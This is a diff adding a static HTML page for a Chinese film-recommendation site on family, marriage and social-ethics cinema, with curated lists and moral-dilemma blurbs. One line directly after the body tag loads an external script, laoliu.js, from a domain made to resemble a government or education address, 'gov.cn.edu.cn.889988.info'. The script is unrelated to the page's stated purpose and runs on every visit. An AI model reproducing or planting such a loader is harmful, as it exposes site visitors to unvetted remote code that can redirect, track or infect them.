@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>人间伦理电影网 - 家庭、婚姻与人性选择</title>
+<meta name="description" content="人间伦理电影网(renjianlunlidianyingwang-h5)整理家庭伦理、婚姻困境、代际冲突、社会道德与人性选择类电影片单，编辑型推荐，移动端自适应，必应收录友好。">
+<meta name="keywords" content="人间伦理电影网, 伦理片, 家庭伦理, 婚姻电影, 代际冲突, 社会伦理, 人性选择">
+<meta name="author" content="人间伦理电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://renjianlunlidianyingwang-h5.github.io/">
+
+<style>
+:root{
+  --paper:#f5f1e8;
+  --paper2:#efe9db;
+  --ink:#26241f;
+  --soft:#6b6354;
+  --seal:#9c3b2e;
+  --bamboo:#3f6f57;
+  --gold:#a9823c;
+  --line:#d9cfb8;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  font-family:"Songti SC","Noto Serif CJK SC","PingFang SC",serif;
+  background:
+    repeating-linear-gradient(0deg,transparent 0 26px,rgba(0,0,0,.012) 26px 27px),
+    var(--paper);
+  color:var(--ink);line-height:1.78;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 朱批条 */
+.seal-bar{
+  background:var(--seal);color:#f3e7df;
+  text-align:center;font-size:11px;letter-spacing:3px;
+  padding:6px 10px;font-family:Arial,sans-serif;
+}
+
+/* 头部 */
+.header{max-width:1120px;margin:0 auto;padding:28px 20px 14px;text-align:center}
+.brush{
+  display:inline-block;padding:10px 22px;
+  border:2px solid var(--seal);border-radius:6px;
+  background:linear-gradient(180deg,#2c211a,#43302518);
+  background-color:#33271f;color:#f0e2d2;
+  box-shadow:0 6px 18px rgba(156,59,46,.18);
+}
+.brush h1{font-size:28px;letter-spacing:4px}
+.brush .en{font-family:Arial,sans-serif;font-size:11px;color:#d8c3b4;letter-spacing:2px}
+.header p.slogan{margin-top:10px;color:var(--soft);font-size:13px}
+
+/* 导航 */
+.nav{max-width:1120px;margin:0 auto 20px;padding:0 20px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+.nav a{padding:7px 15px;border:1px solid var(--line);border-radius:20px;font-size:13px;color:var(--soft);background:#fbf7ee}
+.nav a:hover,.nav a.active{background:var(--seal);color:#fff;border-color:var(--seal)}
+
+/* 主区 */
+.main{max-width:1120px;margin:0 auto;padding:0 20px 30px}
+
+/* 卷首语 */
+.scroll-banner{
+  background:linear-gradient(135deg,#33271f,#4a3a2c);
+  color:#efe3d2;border-left:6px solid var(--gold);
+  border-radius:14px;padding:26px 24px;position:relative;overflow:hidden;margin-bottom:28px;
+}
+.scroll-banner::after{content:"📜";position:absolute;right:14px;bottom:-14px;font-size:120px;opacity:.08}
+.scroll-banner .kicker{font-family:Arial,sans-serif;font-size:12px;color:var(--gold);letter-spacing:3px}
+.scroll-banner h2{font-size:24px;margin:6px 0 8px;color:#fff}
+.scroll-banner p{font-size:14px;color:#d7cbb8;max-width:640px}
+.scroll-banner .tags{margin-top:14px;display:flex;gap:8px;flex-wrap:wrap}
+.scroll-banner .tags span{padding:4px 12px;border:1px solid #6b6354;border-radius:20px;font-size:12px;color:var(--gold)}
+
+/* 栏目头 */
+.section{margin-bottom:30px}
+.s-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;border-bottom:2px solid var(--line);padding-bottom:8px}
+.s-head .no{width:30px;height:30px;border-radius:6px;background:var(--ink);color:#f5f1e8;display:flex;align-items:center;justify-content:center;font-weight:800}
+.s-head h3{font-size:18px;letter-spacing:1px}
+.s-head .more{margin-left:auto;font-size:12px;color:var(--seal);font-family:Arial,sans-serif}
+
+/* 栏目一：伦理象限 */
+.quad{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+.ethic-card{
+  background:#fbf7ee;border:1px solid var(--line);
+  border-top:3px solid var(--bamboo);border-radius:12px;padding:18px;
+}
+.ethic-card h4{font-size:16px;margin-bottom:4px}
+.ethic-card .meta{font-size:12px;color:var(--soft);font-family:Arial,sans-serif;margin-bottom:8px}
+.ethic-card p{font-size:13px;color:#4a4438}
+.ethic-card .films{margin-top:10px;font-size:12px;color:var(--bamboo)}
+
+/* 栏目二：道德困境 */
+.dilemma{background:#fbf7ee;border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.dilemma-row{display:flex;gap:14px;padding:14px 16px;border-bottom:1px dashed var(--line);align-items:flex-start}
+.dilemma-row:last-child{border-bottom:none}
+.dilemma-no{width:34px;height:34px;border-radius:50%;background:var(--seal);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;flex-shrink:0}
+.dilemma-info h4{font-size:15px}
+.dilemma-info p{font-size:12px;color:var(--soft);margin-top:2px}
+.dilemma-side{margin-left:auto;font-size:11px;color:var(--gold);border:1px solid var(--line);padding:3px 10px;border-radius:12px;white-space:nowrap}
+
+/* 栏目三：编辑长卷 横向 */
+.reel-scroll{display:flex;gap:14px;overflow-x:auto;padding-bottom:10px;scroll-snap-type:x mandatory}
+.reel-card{scroll-snap-align:start;flex:0 0 220px;background:#fbf7ee;border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.reel-top{height:78px;display:flex;align-items:center;justify-content:center;font-size:34px;background:linear-gradient(135deg,var(--bamboo),#2c5040);color:#eaf3ee}
+.reel-card:nth-child(2) .reel-top{background:linear-gradient(135deg,var(--seal),#6f261c)}
+.reel-card:nth-child(3) .reel-top{background:linear-gradient(135deg,var(--gold),#7c5a22)}
+.reel-card:nth-child(4) .reel-top{background:linear-gradient(135deg,#3a4a6b,#243352)}
+.reel-card:nth-child(5) .reel-top{background:linear-gradient(135deg,#7a5ea8,#4f3b73)}
+.reel-body{padding:12px}
+.reel-body h4{font-size:14px;margin-bottom:4px}
+.reel-body p{font-size:11px;color:var(--soft);line-height:1.5}
+
+/* 栏目四：编辑方针 */
+.about{background:#33271f;color:#e9dccb;border-radius:12px;padding:24px;display:flex;gap:18px;align-items:flex-start;flex-wrap:wrap}
+.about .ico{font-size:38px}
+.about h3{font-size:17px;color:var(--gold);margin-bottom:6px}
+.about p{font-size:13px;color:#d3c6b3;max-width:660px}
+.about .url{margin-top:8px;font-family:Arial,sans-serif;font-size:12px;color:var(--gold)}
+
+/* 页脚 */
+.footer{margin-top:30px;border-top:3px double var(--line);padding:26px 20px 38px;text-align:center;color:var(--soft);font-size:12px;font-family:Arial,sans-serif}
+.footer a{color:var(--seal)}
+.footer .fn{margin-top:12px;display:flex;justify-content:center;gap:16px;flex-wrap:wrap}
+.footer .fn a{color:var(--soft)}
+.footer .fn a:hover{color:var(--ink)}
+
+@media(max-width:860px){.quad{grid-template-columns:1fr}}
+@media(max-width:640px){
+  .brush h1{font-size:22px}
+  .nav a{padding:6px 12px;font-size:12px}
+  .scroll-banner{padding:20px 16px}
+  .scroll-banner h2{font-size:20px}
+  .main{padding:14px 16px 24px}
+  .dilemma-row{flex-wrap:wrap}
+  .dilemma-side{margin-left:0}
+  .reel-card{flex-basis:80%}
+  .about{padding:18px 14px}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="seal-bar">📜 人间伦理电影网 · 家庭 / 婚姻 / 人性选择 · 单页自适应 · 必应收录友好</div>
+
+<header class="header">
+  <div class="brush">
+    <h1>人间伦理电影网</h1>
+    <div class="en">renjianlunlidianyingwang-h5 · Human Ethics Cinema</div>
+  </div>
+  <p class="slogan">不挂“福利片”，只谈人怎么办：饭桌上的沉默、离婚协议、养老选择、孩子撒的那个谎。</p>
+</header>
+
+<nav class="nav">
+  <a href="#" class="active">卷首</a>
+  <a href="#">家庭伦理</a>
+  <a href="#">婚姻困境</a>
+  <a href="#">代际冲突</a>
+  <a href="#">社会道德</a>
+  <a href="#">人性选择</a>
+  <a href="#">编辑札记</a>
+  <a href="#">关于本站</a>
+</nav>
+
+<div class="main">
+
+  <section class="scroll-banner">
+    <div class="kicker">ETHICS · FAMILY · CHOICE</div>
+    <h2>伦理片不是“带色片子”，是“人该怎么活”的片子</h2>
+    <p>我们把伦理片放回正经语境：亲子关系、婚姻边界、医患/师生/代际权力、社会偏见与个体良知。每部片都附“困境一句话”，不猎奇、不软色情、不碰未授权资源。</p>
+    <div class="tags">
+      <span>家庭</span><span>婚姻</span><span>代际</span><span>良知</span><span>社会偏见</span>
+    </div>
+  </section>
+
+  <!-- 栏目一 -->
+  <section class="section" id="quad">
+    <div class="s-head"><span class="no">01</span><h3>伦理四象限</h3><a class="more" href="#">全部分类 #</a></div>
+    <div class="quad">
+      <article class="ethic-card">
+        <h4>家庭伦理</h4>
+        <div class="meta">亲子 / 赡养 / 兄弟姐妹 / 饭桌权力</div>
+        <p>家不是童话结尾，而是每天重新谈判的地方。《一次别离》里看护父亲与保住工作的两难，比任何悬疑都狠。</p>
+        <div class="films">《一次别离》《小偷家族》《饮食男女》《步履不停》</div>
+      </article>
+      <article class="ethic-card">
+        <h4>婚姻与亲密关系</h4>
+        <div class="meta">出轨 / 离婚 / 沉默 / 财产与尊严</div>
+        <p>婚姻片拍的是“两个成年人如何失败或继续”。《婚姻故事》把律师费、抚养权、自尊碎成一地。</p>
+        <div class="films">《婚姻故事》《消失的爱人》《花样年华》《45周年》</div>
+      </article>
+      <article class="ethic-card">
+        <h4>代际冲突</h4>
+        <div class="meta">父母逻辑 / 子女出走 / 城乡 / 教育</div>
+        <p>上一代用生存说话，下一代用感受说话。《狗十三》里一块狗肉，就是中国式成长的暗伤。</p>
+        <div class="films">《狗十三》《阳光普照》《都挺好》（剧改谈）《我的九月》</div>
+      </article>
+      <article class="ethic-card">
+        <h4>社会伦理</h4>
+        <div class="meta">偏见 / 制度 / 良知 / 旁观者</div>
+        <p>当规则本身有缝，个人怎么选？《狩猎》里一句谣言毁掉一个人，《辩护人》里律师变成被告。</p>
+        <div class="films">《狩猎》《辩护人》《聚焦》《十二怒汉》</div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section class="section" id="dilemma">
+    <div class="s-head"><span class="no">02</span><h3>道德困境 · 一句话</h3><a class="more" href="#">完整清单 #</a></div>
+    <div class="dilemma">
+      <div class="dilemma-row">
+        <div class="dilemma-no">1</div>
+        <div class="dilemma-info"><h4>《一次别离》</h4><p>雇来的护工摔倒流产，是你推的吗？没有监控时，诚实和自保怎么分？</p></div>
+        <div class="dilemma-side">诚实 / 生存</div>
+      </div>
+      <div class="dilemma-row">
+        <div class="dilemma-no">2</div>
+        <div class="dilemma-info"><h4>《小偷家族》</h4><p>没有血缘的人互相取暖，却靠偷东西活着。这样的“家”，该被拆穿还是被放过？</p></div>
+        <div class="dilemma-side">爱 / 法</div>
+      </div>
+      <div class="dilemma-row">
+        <div class="dilemma-no">3</div>
+        <div class="dilemma-info"><h4>《狩猎》</h4><p>全世界都信孩子的话，只有你知道是假的。谣言社会里，清白要花多大代价证明？</p></div>
+        <div class="dilemma-side">群体 / 个体</div>
+      </div>
+      <div class="dilemma-row">
+        <div class="dilemma-no">4</div>
+        <div class="dilemma-info"><h4>《海边的曼彻斯特》</h4><p>犯了错的人，配不配被原谅？还是有些愧疚只能带着活下去？</p></div>
+        <div class="dilemma-side">原谅 / 负重</div>
+      </div>
+      <div class="dilemma-row">
+        <div class="dilemma-no">5</div>
+        <div class="dilemma-info"><h4>《嘉年华》</h4><p>看见真相的人，为什么选择闭嘴？成年世界的沉默，是怎么压到孩子身上的？</p></div>
+        <div class="dilemma-side">旁观 / 发声</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三 -->
+  <section class="section" id="reels">
+    <div class="s-head"><span class="no">03</span><h3>编辑长卷 · 片单抽屉</h3><a class="more" href="#">更多 #</a></div>
+    <div class="reel-scroll">
+      <div class="reel-card"><div class="reel-top">🍚</div><div class="reel-body"><h4>饭桌上的家</h4><p>《饮食男女》《步履不停》《阳光普照》</p></div></div>
+      <div class="reel-card"><div class="reel-top">💍</div><div class="reel-body"><h4>婚姻之后</h4><p>《婚姻故事》《45周年》《花样年华》</p></div></div>
+      <div class="reel-card"><div class="reel-top">🧓</div><div class="reel-body"><h4>父母这一代</h4><p>《闯入者》《我的父亲母亲》《桃姐》</p></div></div>
+      <div class="reel-card"><div class="reel-top">⚖️</div><div class="reel-body"><h4>良知法庭</h4><p>《辩护人》《聚焦》《十二怒汉》</p></div></div>
+      <div class="reel-card"><div class="reel-top">🚪</div><div class="reel-body"><h4>出走与归来</h4><p>《狗十三》《路边野餐》《之后的我们》</p></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目四 -->
+  <section class="section" id="about">
+    <div class="s-head"><span class="no">04</span><h3>编辑方针</h3></div>
+    <div class="about">
+      <div class="ico">🖋️</div>
+      <div>
+        <h3>只做“人怎么办”，不做“擦边点击”</h3>
+        <p>人间伦理电影网（renjianlunlidianyingwang-h5）是伦理片编辑站：家庭、婚姻、代际、社会道德、人性选择五条线。页面单页静态、移动端自适应、内页用 # 占位；不收录色情/软色情，不提供盗版下载，正版播放渠道另附外链。</p>
+        <div class="url">https://renjianlunlidianyingwang-h5.github.io</div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div>© 2026 人间伦理电影网 | renjianlunlidianyingwang-h5</div>
+  <div>永久地址：<a href="https://renjianlunlidianyingwang-h5.github.io">https://renjianlunlidianyingwang-h5.github.io</a></div>
+  <div>本站为伦理电影推荐/片单/札记站，不提供盗版或色情内容。</div>
+  <div class="fn">
+    <a href="#">卷首</a><a href="#">家庭</a><a href="#">婚姻</a><a href="#">代际</a><a href="#">社会</a><a href="#">札记</a><a href="#">关于</a>
+  </div>
+</footer>
+
+</body>
+</html>
